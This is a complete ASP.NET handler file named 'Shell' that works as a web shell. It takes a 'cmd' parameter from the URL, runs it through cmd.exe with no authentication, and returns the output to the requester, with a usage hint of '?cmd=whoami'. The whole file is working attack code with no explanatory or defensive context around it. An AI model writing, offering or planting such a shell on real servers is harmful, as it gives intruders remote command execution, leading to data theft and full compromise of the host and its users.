<%@ WebHandler Language="C#" Class="Shell" %>
using System;
using System.Web;
using System.Diagnostics;

public class Shell : IHttpHandler {
    public void ProcessRequest(HttpContext context) {
        string cmd = context.Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write("<pre>" + output + "</pre>");
        } else {
            context.Response.Write("Usage: ?cmd=whoami");
        }
    }

    public bool IsReusable { get { return false; } }
}
